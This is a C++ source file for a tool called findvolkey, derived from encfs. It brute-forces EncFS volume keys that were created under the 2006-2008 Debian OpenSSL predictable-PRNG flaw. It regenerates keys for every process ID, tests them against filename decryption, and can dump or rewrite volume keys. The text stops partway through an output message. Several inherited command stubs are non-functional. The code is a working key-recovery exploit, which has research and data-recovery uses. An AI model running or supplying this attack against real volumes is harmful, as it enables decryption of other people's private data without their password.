/*
 * Author: Lars Stoltenow, 2020
 * Based on encfs code, (c) 2004, Valient Gough
 *
 * This program is free software; you can distribute it and/or modify it under
 * the terms of the GNU General Public License (GPL), as published by the Free
 * Software Foundation; either version 2 of the License, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 * more details.
 */

#include <fcntl.h>
#include <getopt.h>
#include <iostream>
#include <limits.h>
#include <memory>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>
#include <vector>

#define NO_DES
#include <openssl/ssl.h>

#include "Cipher.h"
#include "CipherKey.h"
#include "Context.h"
#include "DirNode.h"
#include "Error.h"
#include "FSConfig.h"
#include "FileNode.h"
#include "FileUtils.h"
#include "Interface.h"
#include "SSL_Cipher.h"
#include "autosprintf.h"
#include "config.h"
#include "i18n.h"
#include "intl/gettext.h"

extern "C" {
#include "botched_rand.h"
BOTCHED_RAND_FUNCS(i386_);
BOTCHED_RAND_FUNCS(amd64_);
}

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

using namespace std;
using gnu::autosprintf;
using namespace encfs;

static int chpasswd(int argc, char **argv);
static int chpasswdAutomaticly(int argc, char **argv);
static int ckpasswdAutomaticly(int argc, char **argv);
static int cmd_ls(int argc, char **argv);
static int cmd_decode(int argc, char **argv);
static int cmd_encode(int argc, char **argv);
static int cmd_showcruft(int argc, char **argv);
static int cmd_cat(int argc, char **argv);
static int cmd_export(int argc, char **argv);

static bool checkDir(string &rootDir);

static int opt_check_count = 5;
static bool opt_decrypt_files = false;

struct CommandOpts {
	const char *name;
	int minOptions;
	int maxOptions;
	int (*func)(int argc, char **argv);
	const char *argStr;
	const char *usageStr;
} commands[] = {
    {"passwd",          1, 1, chpasswd,            "(root dir)", "  -- change password for volume"},
    {"autopasswd",      1, 1, chpasswdAutomaticly, "(root dir)", "  -- change password for volume, taking password from standard input.\n\tNo prompts are issued."},
    {"autocheckpasswd", 1, 1, ckpasswdAutomaticly, "(root dir)", "  -- check password for volume, taking password from standard input.\n\tNo prompts are issued."},
    {"ls",              1, 2, cmd_ls, 0, 0},
    {"showcruft",       1, 1, cmd_showcruft,       "(root dir)", "  -- show undecodable filenames in the volume"},
    {"cat",             2, 4, cmd_cat,             "[--extpass=prog] [--reverse] (root dir) path", "  -- decodes the file and cats it to standard out"},
    {"decode",          1, 100, cmd_decode,        "[--extpass=prog] (root dir) [encoded-name ...]", "  -- decodes name and prints plaintext version"},
    {"encode",          1, 100, cmd_encode,        "[--extpass=prog] (root dir) [plaintext-name ...]", "  -- encodes a filename and print result"},
    {"export",          2, 2, cmd_export,          "(root dir) path", "  -- decrypts a volume and writes results to path"},
    {0, 0, 0, 0, 0, 0}};

auto ctx = std::make_shared<EncFS_Context>();

static void show_version() {
	cerr << autosprintf("findvolkey version %s", FVK_VERSION) << "\n";
}

static void usage(const char *name) {
	cerr
		<< "Usage:\n"
		<< "\n"
		<< autosprintf("  %s (root dir) search-vuln [--check-count=n] [--check-contents]\n", name)
		<< "      to search for vulnerable keys and list candidates\n"
		<< autosprintf("  %s (root dir) test-key [--check-count=n] [--check-contents] (pid-gen or key)\n", name)
		<< "      to test a specific key\n"
		<< autosprintf("  %s (root dir) write-key (pid-gen or key)\n", name)
		<< "      to write a new config file with the given volume key\n"
		<< autosprintf("  %s (root dir) dump-key\n", name)
		<< "      to decrypt a volume using password and dump the raw key bytes\n"
		<< "\n"
		<< "(root dir) is the path to the encrypted encfs volume\n"
		<< "(pid-gen or id) describes the volume key, either a pid+generator as output by search-vuln, or a hexadecimal volume key\n";
}

static RootPtr initRootInfo(int &argc, char **&argv) {
	RootPtr result;
	std::shared_ptr<EncFS_Opts> opts(new EncFS_Opts());
	opts->createIfNotFound = false;
	opts->checkKey = false;

	if (argc == 0) {
		cerr << _("Incorrect number of arguments") << "\n";
	} else {
		opts->rootDir = string(argv[0]);

		--argc;
		++argv;

		ctx->publicFilesystem = opts->ownerCreate;
		if (checkDir(opts->rootDir)) result = initFS(ctx.get(), opts);

		if (!result)
			cerr << _("Unable to initialize encrypted filesystem - check path.\n");
	}

	return result;
}

static int cmd_decode(int argc, char **argv) {
  RootPtr rootInfo = initRootInfo(argc, argv);
  if (!rootInfo) return EXIT_FAILURE;

  if (argc > 0) {
    for (int i = 0; i < argc; ++i) {
      string name = rootInfo->root->plainPath(argv[i]);
      cout << name << "\n";
    }
  } else {
    char buf[PATH_MAX + 1];
    while (cin.getline(buf, PATH_MAX)) {
      cout << rootInfo->root->plainPath(buf) << "\n";
    }
  }
  return EXIT_SUCCESS;
}

static int cmd_encode(int argc, char **argv) {
  RootPtr rootInfo = initRootInfo(argc, argv);
  if (!rootInfo) return EXIT_FAILURE;

  if (argc > 0) {
    for (int i = 0; i < argc; ++i) {
      string name = rootInfo->root->cipherPathWithoutRoot(argv[i]);
      cout << name << "\n";
    }
  } else {
    char buf[PATH_MAX + 1];
    while (cin.getline(buf, PATH_MAX)) {
      cout << rootInfo->root->cipherPathWithoutRoot(buf) << "\n";
    }
  }
  return EXIT_SUCCESS;
}

static int cmd_ls(int argc, char **argv) {
  (void)argc;

  RootPtr rootInfo = nullptr;

  if (!rootInfo) return EXIT_FAILURE;

  // show files in directory
  {
    DirTraverse dt = rootInfo->root->openDir("/");
    if (dt.valid()) {
      for (string name = dt.nextPlaintextName(); !name.empty();
           name = dt.nextPlaintextName()) {
        std::shared_ptr<FileNode> fnode =
            rootInfo->root->lookupNode(name.c_str(), "encfsctl-ls");
        struct stat stbuf;
        fnode->getAttr(&stbuf);

        struct tm stm;
        localtime_r(&stbuf.st_mtime, &stm);
        stm.tm_year += 1900;
        // TODO: when I add "%s" to the end and name.c_str(), I get a
        // seg fault from within strlen.  Why ???
        printf("%11i %4i-%02i-%02i %02i:%02i:%02i %s\n", int(stbuf.st_size),
               int(stm.tm_year), int(stm.tm_mon), int(stm.tm_mday),
               int(stm.tm_hour), int(stm.tm_min), int(stm.tm_sec),
               name.c_str());
      }
    }
  }

  return EXIT_SUCCESS;
}

// apply an operation to every block in the file
template <typename T>
int processContents(const std::shared_ptr<EncFS_Root> &rootInfo,
                    const char *path, T &op) {
  int errCode = 0;
  std::shared_ptr<FileNode> node;

  try {
    node = rootInfo->root->openNode(path, "encfsctl", O_RDONLY, &errCode);
  }
  catch(...) {}

  if (!node) {
    // try treating filename as an enciphered path
    string plainName = rootInfo->root->plainPath(path);
    if (plainName.length() > 0) {
      node = rootInfo->root->lookupNode(plainName.c_str(), "encfsctl");
    }
    if (node) {
      errCode = node->open(O_RDONLY);
      if (errCode < 0) node.reset();
    }
  }

  if (!node) {
    cerr << "unable to open " << path << "\n";
    return errCode;
  } else {
    unsigned char buf[512];
    int blocks = (node->getSize() + sizeof(buf) - 1) / sizeof(buf);
    // read all the data in blocks
    for (int i = 0; i < blocks; ++i) {
      int bytes = node->read(i * sizeof(buf), buf, sizeof(buf));
      int res = op(buf, bytes);
      if (res < 0) return res;
    }
  }
  return 0;
}

class WriteOutput {
  int _fd;

 public:
  WriteOutput(int fd) { _fd = fd; }
  ~WriteOutput() { close(_fd); }

  int operator()(const void *buf, int count) {
    return (int)write(_fd, buf, count);
  }
};

static int cmd_cat(int argc, char **argv) {
  RootPtr rootInfo = initRootInfo(argc, argv);

  if (!rootInfo) return EXIT_FAILURE;

  const char *path = argv[0];
  // If user provides a leading slash, in reverse mode, it will be converted
  // to "+" by plainpath, and will fail to decode... Workaround below then...
  if (path[0] == '/') {
    path++;
  }
  WriteOutput output(STDOUT_FILENO);
  int errCode = processContents(rootInfo, path, output);

  return errCode;
}

static int copyLink(const struct stat &stBuf,
                    const std::shared_ptr<EncFS_Root> &rootInfo,
                    const string &cpath, const string &destName) {
  std::vector<char> buf(stBuf.st_size + 1, '\0');
  int res = ::readlink(cpath.c_str(), buf.data(), stBuf.st_size);
  if (res == -1) {
    cerr << "unable to readlink of " << cpath << "\n";
    return EXIT_FAILURE;
  }

  buf[res] = '\0';
  string decodedLink = rootInfo->root->plainPath(buf.data());

  res = ::symlink(decodedLink.c_str(), destName.c_str());
  if (res == -1) {
    cerr << "unable to create symlink for " << cpath << " to " << decodedLink
         << "\n";
  }

  return EXIT_SUCCESS;
}

static int copyContents(const std::shared_ptr<EncFS_Root> &rootInfo,
                        const char *encfsName, const char *targetName) {
  std::shared_ptr<FileNode> node =
      rootInfo->root->lookupNode(encfsName, "encfsctl");

  if (!node) {
    cerr << "unable to open " << encfsName << "\n";
    return EXIT_FAILURE;
  } else {
    struct stat st;

    if (node->getAttr(&st) != 0) return EXIT_FAILURE;

    if ((st.st_mode & S_IFMT) == S_IFLNK) {
      string d = rootInfo->root->cipherPath(encfsName);
      char linkContents[PATH_MAX + 2];

      if (readlink(d.c_str(), linkContents, PATH_MAX + 1) <= 0) {
        cerr << "unable to read link " << encfsName << "\n";
        return EXIT_FAILURE;
      }
      if (symlink(rootInfo->root->plainPath(linkContents).c_str(),
                  targetName) != 0) {
        cerr << "unable to create symlink " << targetName << "\n";
        return EXIT_FAILURE;
      }
    } else {
      int outfd = creat(targetName, st.st_mode);

      WriteOutput output(outfd);
      processContents(rootInfo, encfsName, output);
    }
  }
  return EXIT_SUCCESS;
}

static bool endsWith(const string &str, char ch) {
  if (str.empty())
    return false;
  else
    return str[str.length() - 1] == ch;
}

static int traverseDirs(const std::shared_ptr<EncFS_Root> &rootInfo,
                        string volumeDir, string destDir) {
  if (!endsWith(volumeDir, '/')) volumeDir.append("/");
  if (!endsWith(destDir, '/')) destDir.append("/");

  // Lookup directory node so we can create a destination directory
  // with the same permissions
  {
    struct stat st;
    std::shared_ptr<FileNode> dirNode =
        rootInfo->root->lookupNode(volumeDir.c_str(), "encfsctl");
    if (dirNode->getAttr(&st)) return EXIT_FAILURE;

    mkdir(destDir.c_str(), st.st_mode);
  }

  // show files in directory
  DirTraverse dt = rootInfo->root->openDir(volumeDir.c_str());
  if (dt.valid()) {
    for (string name = dt.nextPlaintextName(); !name.empty();
         name = dt.nextPlaintextName()) {
      // Recurse to subdirectories
      if (name != "." && name != "..") {
        string plainPath = volumeDir + name;
        string cpath = rootInfo->root->cipherPath(plainPath.c_str());
        string destName = destDir + name;

        int r = EXIT_SUCCESS;
        struct stat stBuf;
        if (!lstat(cpath.c_str(), &stBuf)) {
          if (S_ISDIR(stBuf.st_mode)) {
            traverseDirs(rootInfo, (plainPath + '/').c_str(), destName + '/');
          } else if (S_ISLNK(stBuf.st_mode)) {
            r = copyLink(stBuf, rootInfo, cpath, destName);
          } else {
            r = copyContents(rootInfo, plainPath.c_str(), destName.c_str());
          }
        } else {
          r = EXIT_FAILURE;
        }

        if (r != EXIT_SUCCESS) return r;
      }
    }
  }
  return EXIT_SUCCESS;
}

static int cmd_export(int argc, char **argv) {
  (void)argc;

  RootPtr rootInfo = nullptr;

  if (!rootInfo) return EXIT_FAILURE;

  string destDir = argv[2];
  // if the dir doesn't exist, then create it (with user permission)
  if (!checkDir(destDir) && !userAllowMkdir(destDir.c_str(), 0700))
    return EXIT_FAILURE;

  return traverseDirs(rootInfo, "/", destDir);
}

int showcruft(const std::shared_ptr<EncFS_Root> &rootInfo,
              const char *dirName) {
  int found = 0;
  DirTraverse dt = rootInfo->root->openDir(dirName);
  if (dt.valid()) {
    bool showedDir = false;
    for (string name = dt.nextInvalid(); !name.empty();
         name = dt.nextInvalid()) {
      string cpath = rootInfo->root->cipherPath(dirName);
      cpath += '/';
      cpath += name;

      if (!showedDir) {
        // just before showing a list of files in a directory
        cout << autosprintf(_("In directory %s: \n"), dirName);
        showedDir = true;
      }
      ++found;
      cout << cpath << "\n";
    }

    // now go back and look for directories to recurse into..
    dt = rootInfo->root->openDir(dirName);
    if (dt.valid()) {
      for (string name = dt.nextPlaintextName(); !name.empty();
           name = dt.nextPlaintextName()) {
        if (name == "." || name == "..") continue;

        string plainPath = dirName;
        plainPath += '/';
        plainPath += name;

        string cpath = rootInfo->root->cipherPath(plainPath.c_str());

        if (isDirectory(cpath.c_str()))
          found += showcruft(rootInfo, plainPath.c_str());
      }
    }
  }

  return found;
}

/*
    iterate recursively through the filesystem and print out names of files
    which have filenames which cannot be decoded with the given key..
*/
static int cmd_showcruft(int argc, char **argv) {
  (void)argc;

  RootPtr rootInfo = nullptr;

  if (!rootInfo) return EXIT_FAILURE;

  int filesFound = showcruft(rootInfo, "/");

  // TODO: the singular version should say "Found an invalid file", but all the
  // translations
  // depend upon this broken singular form, so it isn't easy to change.
  cerr << autosprintf(ngettext("Found %i invalid file.",
                               "Found %i invalid files.", filesFound),
                      filesFound)
       << "\n";

  return EXIT_SUCCESS;
}

static int do_chpasswd(bool useStdin, bool annotate, bool checkOnly, int argc,
                       char **argv) {
	string rootDir = argv[1];
	if (!checkDir(rootDir)) return EXIT_FAILURE;

	EncFSConfig *config = new EncFSConfig;
	ConfigType cfgType = readConfig(rootDir, config, "");

	if (cfgType == Config_None) {
		cout << _("Unable to load or parse config file\n");
		return EXIT_FAILURE;
	}

	// instanciate proper cipher
	std::shared_ptr<Cipher> cipher =
		Cipher::New(config->cipherIface, config->keySize);
	if (!cipher) {
		cout << autosprintf(_("Unable to find specified cipher \"%s\"\n"),
				config->cipherIface.name().c_str());
		return EXIT_FAILURE;
	}

	// ask for existing password
	cout << _("Enter current Encfs password\n");
	if (annotate) cerr << "$PROMPT$ passwd" << endl;
	CipherKey userKey = config->getUserKey(useStdin);
	if (!userKey) return EXIT_FAILURE;

	// decode volume key using user key -- at this point we detect an incorrect
	// password if the key checksum does not match (causing readKey to fail).
	CipherKey volumeKey = cipher->readKey(config->getKeyData(), userKey);

	if (!volumeKey) {
		cout << _("Invalid password\n");
		return EXIT_FAILURE;
	}

	if (checkOnly) {
		cout << _("Password is correct\n");
		return EXIT_SUCCESS;
	}

	// Now, get New user key..
	userKey.reset();
	cout << _("Enter new Encfs password\n");
	// reinitialize salt and iteration count
	config->kdfIterations = 0;  // generate new

	if (useStdin) {
		if (annotate) cerr << "$PROMPT$ new_passwd" << endl;
		userKey = config->getUserKey(true);
	} else
		userKey = config->getNewUserKey();

	// re-encode the volume key using the new user key and write it out..
	int result = EXIT_FAILURE;
	if (userKey) {
		int encodedKeySize = cipher->encodedKeySize();
		unsigned char *keyBuf = new unsigned char[encodedKeySize];

		// encode volume key with new user key
		cipher->writeKey(volumeKey, keyBuf, userKey);
		userKey.reset();

		config->assignKeyData(keyBuf, encodedKeySize);
		delete[] keyBuf;

		if (saveConfig(cfgType, rootDir, config, "")) {
			// password modified -- changes volume key of filesystem..
			cout << _("Volume Key successfully updated.\n");
			result = EXIT_SUCCESS;
		} else {
			cout << _("Error saving modified config file.\n");
		}
	} else {
		cout << _("Error creating key\n");
	}

	volumeKey.reset();

	return result;
}

static int chpasswd(int argc, char **argv) {
  return do_chpasswd(false, false, false, argc, argv);
}

static int chpasswdAutomaticly(int argc, char **argv) {
  return do_chpasswd(true, false, false, argc, argv);
}

static int ckpasswdAutomaticly(int argc, char **argv) {
  return do_chpasswd(true, false, true, argc, argv);
}



/**
 * Some decoding failures are to be ignored. This includes e.g. encfs config
 * files and their backups. (We simply match .encfs*)
 */
static bool isIgnoredFilename(const char *fn_base) {
	return strncmp(fn_base, ".encfs", strlen(".encfs")) == 0;
}

/**
 * CruftScore(tm) is computed by attempting decryption of the filenames in the
 * volume. Successful decode adds one, failed decode subtracts one. The
 * process works recursively unless the cruft score for the files alone
 * exceed some limit. (i.e. if the filenames alone produce many decode errors
 * then there is no need to recurse further, if the caller wishes).
 */
int computeCruftScore(
	const std::shared_ptr<EncFS_Root> &rootInfo,
	const char *dirName,
	int minScore, int maxScore
) {
	int found = 0;

	DirTraverse dt = rootInfo->root->openDir(dirName);
	if (!dt.valid()) {
		// ???
		return 0;
	}
	for (string name = dt.nextInvalid(); !name.empty(); name = dt.nextInvalid()) {
		if (isIgnoredFilename(name.c_str())) {
			// cout << "* " << name << "\n";
			continue;
		}

		found--;
		// cout << "- " << name << " now " << found << "\n";
	}

	// now go back and look for directories to recurse into..
	dt = rootInfo->root->openDir(dirName);
	if (!dt.valid()) {
		// ???
		return 0;
	}
	for (string name = dt.nextPlaintextName(); !name.empty(); name = dt.nextPlaintextName()) {
		if (name == "." || name == "..") continue;

		string plainPath = dirName;
		plainPath += '/';
		plainPath += name;
		found++;
		// cout << "+ " << plainPath << " now " << found << "\n";

		string cpath = rootInfo->root->cipherPath(plainPath.c_str());

		if (isDirectory(cpath.c_str())) {
			found += computeCruftScore(rootInfo, plainPath.c_str(), minScore - found, maxScore + found);
		}
		if ((found <= minScore) || (found >= maxScore)) {
			// can stop early
			// cout << "stopping early\n";
			return found;
		}
	}

	return found;
}











static void println_buf(unsigned char *buf, int len) {
	for (int i = 0; i < len; i++) {
		printf("%02x ", buf[i]);
	}
	printf("\n");
}


/**
 * Possible architectures for the vulnerable OpenSSL libraries.
 * Not sure if there is any effect other than the size of (unsigned) long...
 */
enum Architecture { Arch_i386, Arch_amd64 };

/**
 * "Interface" for parametrized PRNGs (the P stands for "predictable").
 *
 * Implementations should provide additional methods to reset the RNG to its
 * initial state, given some parameters.
 */
class PredictableRNG {
public:
	/**
	 * Generate the next batch of random bytes.
	 */
	virtual int rand_bytes(unsigned char *buf, int num) = 0;
};

/**
 * RNGs based on the OpenSSL versions that Debian included 2006-2008
 *
 * FIXME Currently the class itself has no state but it manipulates the global
 * state of botched_rand_*.c instead; never operate on more than one instance
 * at a time
 */
class DebianPRNG : public PredictableRNG {
public:
	DebianPRNG(Architecture arch) {
		_arch = arch;
	}

	/**
	 * Reinitialize the RNG using the given process ID.
	 */
	void reset(pid_t pid) {
		switch (_arch) {
			case Arch_i386:  i386_b_rand_reset(pid);  break;
			case Arch_amd64: amd64_b_rand_reset(pid); break;
			default: rAssert(false);
		}
	}

	virtual int rand_bytes(unsigned char *buf, int num) {
		switch (_arch) {
			case Arch_i386:  return i386_ssleay_rand_bytes(buf, num);
			case Arch_amd64: return amd64_ssleay_rand_bytes(buf, num);
			default: rAssert(false); return 0;
		}
	}

private:
	Architecture _arch;
};

/**
 * "Interface" for key generators, possibly having some parameter that makes
 * the key predictable. The generator will always output the key bytes that
 * EncFS would have generated using these parameters.
 *
 * Mandatory parameter is the number of key bytes (depends on the cipher used).
 * Optional parameters are implementation-dependent.
 */
class KeyGenerator {
public:
	/**
	 * Generate random keybytes using the parameters of this key generator,
	 * for the given number of bytes.
	 */
	virtual void generateKeybytes(unsigned char *buf, int num) = 0;
};

// from EncFS SSL_Cipher.cpp
int BytesToKey(int keyLen, int ivLen, const EVP_MD *md, unsigned char *data, int dataLen, unsigned int rounds, unsigned char *out_keyiv) {
  if (data == NULL || dataLen == 0) {
    return 0;  // OpenSSL returns nkey here, but why?  It is a failure..
  }

  unsigned char mdBuf[EVP_MAX_MD_SIZE];
  unsigned int mds = 0;
  int addmd = 0;
  int nkeyiv = keyLen + ivLen;

  EVP_MD_CTX *cx = EVP_MD_CTX_new();
  EVP_MD_CTX_init(cx);

  for (;;) {
    EVP_DigestInit_ex(cx, md, NULL);
    if ((addmd++) != 0) {
      EVP_DigestUpdate(cx, mdBuf, mds);
    }
    EVP_DigestUpdate(cx, data, dataLen);
    EVP_DigestFinal_ex(cx, mdBuf, &mds);

    for (unsigned int i = 1; i < rounds; ++i) {
      EVP_DigestInit_ex(cx, md, NULL);
      EVP_DigestUpdate(cx, mdBuf, mds);
      EVP_DigestFinal_ex(cx, mdBuf, &mds);
    }

    int offset = 0;
    int toCopy = nkeyiv < (int)mds - offset ? nkeyiv : (int)mds - offset;
    if (toCopy != 0) {
      memcpy(out_keyiv, mdBuf + offset, toCopy);
      out_keyiv += toCopy;
      nkeyiv -= toCopy;
      offset += toCopy;
    }
    if (nkeyiv == 0) {
      break;
    }
  }
  EVP_MD_CTX_free(cx);
  OPENSSL_cleanse(mdBuf, sizeof(mdBuf));

  return keyLen;
}

class EncfsShaOnDebianKeygen : public KeyGenerator {
public:
	/**
	 * Constructs a key generator that generates the exact same keys as an
	 * EncFS with vulnerable OpenSSL, running on the given architecture.
	 *
	 * The parameter initialSrandBytes indicates how many bytes to initially
	 * request from the PRNG (some EncFS versions requested a few bytes and
	 * fed them to srand()).
	 */
	EncfsShaOnDebianKeygen(Architecture arch, int initialSrandBytes) {
		_arch = arch;
		_initialSrandBytes = initialSrandBytes;
		_prng = new DebianPRNG(arch);
		_pid = 0;
	}

	/**
	 * Set a new process ID to use for future keys.
	 */
	void setPID(pid_t pid) {
		_pid = pid;
	}

	virtual void generateKeybytes(unsigned char *buf, int num) {
		/* Assume a freshly started EncFS process */
		_prng->reset(_pid);
		/* Some versions put some random bytes into srand() ... */
		if (_initialSrandBytes > 0) {
			unsigned char *x = (unsigned char*) alloca(_initialSrandBytes);
			_prng->rand_bytes(x, _initialSrandBytes);
		}
		/* The next call to newRandomKey() would first request 32 bytes (MAX_KEYLENGTH) */
		unsigned char ibuf[32];
		_prng->rand_bytes(ibuf, 32);
		/* But these were not directly used as keybytes. but were fed
		 * into the BytesToKey function for hashing instead
		 * (first two args were keylen and ivlen but these are
		 * contiguous anyway, so we just provide their sum as
		 * total len + 0
		 */
		int bytes __attribute__((unused)) = BytesToKey(num, 0, EVP_sha1(), ibuf, 32, 16, buf);
	}

	string describe() {
		string d = "esd ";
		switch (_arch) {
			case Arch_i386:  d += "i386 "; break;
			case Arch_amd64: d += "amd64 "; break;
			default: rAssert(false);
		}
		d += to_string(_initialSrandBytes);
		return d;
	}

private:
	Architecture _arch;
	int _initialSrandBytes;
	DebianPRNG *_prng;
	pid_t _pid;
};

static void parseKeyFromArgs(char *args[], int nargs, unsigned char *out_buf, int nkeybytes) {
	if (nargs < 1) {
		cerr << "Key expected, but no arguments given.\n";
		exit(EXIT_FAILURE);
	}

	if (!strcmp(args[0], "raw")) {
		if (nargs - 1 != nkeybytes) {
			cerr << "Expected " << nkeybytes << " bytes of key material but " << (nargs - 1) << " bytes have been provided as arguments\n";
			exit(EXIT_FAILURE);
		}
		for (int i = 0; i < nkeybytes; i++) {
			long cur = strtol(args[1+i], NULL, 16);
			out_buf[i] = cur & 0xff;
		}
	} else if (!strcmp(args[0], "esd")) {
		if (nargs != 4) {
			cerr << "Expected exactly three arguments (architecture, srand bytes, process id)\n";
			exit(EXIT_FAILURE);
		}

		Architecture arch;
		if (!strcmp(args[1], "i386")) {
			arch = Arch_i386;
		} else if (!strcmp(args[1], "amd64")) {
			arch = Arch_amd64;
		} else {
			cerr << "Unknown architecture \"" << args[1] << "\"\n";
			exit(EXIT_FAILURE);
		}
		long srandBytes = strtol(args[2], NULL, 10);
		long pid = strtol(args[3], NULL, 10);

		EncfsShaOnDebianKeygen keygen(arch, srandBytes);
		keygen.setPID(pid);
		keygen.generateKeybytes(out_buf, nkeybytes);
	} else {
		cerr << "Unknown key type \"" << args[0] << "\"\n";
		exit(EXIT_FAILURE);
	}
}


static int list_files(RootPtr rootInfo) {
  if (!rootInfo) return EXIT_FAILURE;

  // show files in directory
  {
    DirTraverse dt = rootInfo->root->openDir("/");
    if (dt.valid()) {
      for (string name = dt.nextPlaintextName(); !name.empty();
           name = dt.nextPlaintextName()) {
        std::shared_ptr<FileNode> fnode =
            rootInfo->root->lookupNode(name.c_str(), "encfsctl-ls");
        struct stat stbuf;
        fnode->getAttr(&stbuf);

        struct tm stm;
        localtime_r(&stbuf.st_mtime, &stm);
        stm.tm_year += 1900;
        // TODO: when I add "%s" to the end and name.c_str(), I get a
        // seg fault from within strlen.  Why ???
        printf("%11i %4i-%02i-%02i %02i:%02i:%02i %s\n", int(stbuf.st_size),
               int(stm.tm_year), int(stm.tm_mon), int(stm.tm_mday),
               int(stm.tm_hour), int(stm.tm_min), int(stm.tm_sec),
               name.c_str());
      }
    }
  }

  return EXIT_SUCCESS;
}


static bool checkDir(string &rootDir) {
	if (!isDirectory(rootDir.c_str())) {
		cerr << autosprintf(_("directory %s does not exist.\n"), rootDir.c_str());
		return false;
	}
	if (rootDir[rootDir.length() - 1] != '/') rootDir.append("/");

	return true;
}

static int computeCruftScoreForRootdir(const string &rootDir, unsigned char *keybytes, int keylen) {
	std::shared_ptr<EncFS_Opts> opts(new EncFS_Opts());
	opts->rootDir = rootDir;
	opts->createIfNotFound = false;
	opts->checkKey = false; // meaningless anyway, we can only *guess* if it's the correct key
	opts->volumeKeyData = keybytes;
	opts->volumeKeyLen = keylen;
	RootPtr rootPtr = initFS(ctx.get(), opts);
	if (!rootPtr) {
		cerr << "Unable to open " << rootDir << " as an EncFS volume\n";
		return EXIT_FAILURE;
	}
	return computeCruftScore(rootPtr, "/", -3, +3);
}

static int testForVulnerableKeysOfDebian(EncfsShaOnDebianKeygen keygen, const string &rootDir, int keylen) {
	unsigned char *keybytes = (unsigned char*) alloca(keylen);
	int numcand = 0;

	string keygenDescr = keygen.describe();
	cerr << "Checking keys of " << keygenDescr << "\n";
	for (int pid = 0; pid <= 32768; pid++) {
		keygen.setPID(pid);
		keygen.generateKeybytes(keybytes, keylen);
		int cruftScore = computeCruftScoreForRootdir(rootDir, keybytes, keylen);
		if (cruftScore >= 0) {
			cout << "key candidate (score " << cruftScore << "): " << keygenDescr << ' ' << pid << "\n";
			numcand++;
		}
	}
	return numcand;
}


int main(int argc, char **argv) {
	START_EASYLOGGINGPP(argc, argv);
	encfs::initLogging();

#if defined(ENABLE_NLS) && defined(LOCALEDIR)
	setlocale(LC_ALL, "");
	bindtextdomain(PACKAGE, LOCALEDIR);
	textdomain(PACKAGE);
#endif

	SSL_load_error_strings();
	SSL_library_init();

	static struct option long_options[] = {
		{"check-count",    required_argument,  nullptr, 'c'},
		{"decrypt-files",  no_argument,        nullptr, 'd'},
		{"help",           no_argument,        nullptr, 'h'},
		{"version",        no_argument,        nullptr, 'V'},
		{0, 0, 0, 0}
	};

	for (;;) {
		int option_index = 0;

		int res = getopt_long(argc, argv, "", long_options, &option_index);
		if (res == -1) break;

		switch (res) {
		case 'c':
			opt_check_count = atoi(optarg);
			break;
		case 'd':
			opt_decrypt_files = true;
			break;
		case 'h':
			usage(argv[0]);
			return EXIT_FAILURE;
		case 'V':
			show_version();
			return EXIT_SUCCESS;
		default:
			usage(argv[0]);
			return EXIT_FAILURE;
		}
	}

	argc -= optind;
	argv += optind;

	/* Should have at least two arguments now: rootdir and command */
	if (argc < 2) {
		cerr << "At least two non-option arguments (rootdir and command) required, but only " << argc << " given\n";
		return EXIT_FAILURE;
	}

	/* Try to open first arg as encfs volume */
	string rootDir = argv[0];
	if (!checkDir(rootDir)) return EXIT_FAILURE;

	std::shared_ptr<EncFSConfig> config(new EncFSConfig);
	ConfigType type = readConfig(rootDir, config.get(), "");

	/* Check if loading was successful */
	switch (type) {
	case Config_None:
		cerr << rootDir << " does not seem to be an EncFS volume\n";
		return EXIT_FAILURE;
	case Config_Prehistoric:
	case Config_V3:
		cerr << rootDir << " contains an unsupported (very old) EncFS volume\n";
		return EXIT_FAILURE;
	case Config_V4:
	case Config_V5:
	case Config_V6:
		break;
	default:
		cerr << "Unexpected EncFS config type\n";
		return EXIT_FAILURE;
	}

	cerr << "Opened " << rootDir << ":\n";
	showFSInfo(config.get());
	std::shared_ptr<SSL_Cipher> cipher = dynamic_pointer_cast<SSL_Cipher>(config.get()->getCipher());
	cerr << "Number of key bytes: " << cipher->rawKeySize() << "\n";

	// Note that for key verification and re-writing we need to call initFS again, but this way we get at least key parameters

	/* Success! Now find out what to do with it */
	char *command = argv[1];

	if (!strcmp(command, "dump-key")) {
		// Open volume using password
		std::shared_ptr<EncFS_Opts> opts(new EncFS_Opts());
		opts->rootDir = rootDir;
		opts->createIfNotFound = false;
		opts->checkKey = true;
		RootPtr rootPtr = initFS(ctx.get(), opts);
		if (!rootPtr) {
			cerr << "Unable to open " << rootDir << " as an EncFS volume\n";
			return EXIT_FAILURE;
		}

		unsigned char *keydata = SSLKey_getData((SSLKey*)(rootPtr->volumeKey.get()));
		int keylen = cipher->rawKeySize();

		println_buf(keydata, keylen);

		return EXIT_SUCCESS;
	} else if (!strcmp(command, "test-key")) {
		int keylen = cipher->rawKeySize();
		unsigned char *keybytes = (unsigned char*) malloc(keylen);
		parseKeyFromArgs(argv+2, argc-2, keybytes, keylen);

		std::shared_ptr<EncFS_Opts> opts(new EncFS_Opts());
		opts->rootDir = rootDir;
		opts->createIfNotFound = false;
		opts->checkKey = false; // meaningless anyway, we can only *guess* if it's the correct key
		opts->volumeKeyData = keybytes;
		opts->volumeKeyLen = keylen;
		RootPtr rootPtr = initFS(ctx.get(), opts);
		if (!rootPtr) {
			cerr << "Unable to open " << rootDir << " as an EncFS volume\n";
			return EXIT_FAILURE;
		}
		cerr << "If the following listing shows more than . and .., then the key was correct:\n";
		list_files(rootPtr);
		int cruftScore = computeCruftScore(rootPtr, "/", -3, +3);
		cout << "total score: " << cruftScore << "\n";
		return EXIT_SUCCESS;
	} else if (!strcmp(command, "search-vuln")) {
		int keylen = cipher->rawKeySize();

		int numcand = 0;
		Architecture possibleArches[] = { Arch_i386, Arch_amd64 };
		int possibleSrandBytes[] = { 4, 0 };
		for (int srandBytes : possibleSrandBytes) {
			for (Architecture arch : possibleArches) {
				EncfsShaOnDebianKeygen kg(arch, srandBytes);
				numcand += testForVulnerableKeysOfDebian(kg, rootDir, keylen);
			}
		}
		if (numcand > 0) {
			return EXIT_SUCCESS;
		} else {
			cout << "No candidate keys found. :-(\n";
			cout << "Possible reasons:\n";
			cout << "- The volume was not initially created using a vulnerable OpenSSL version\n";
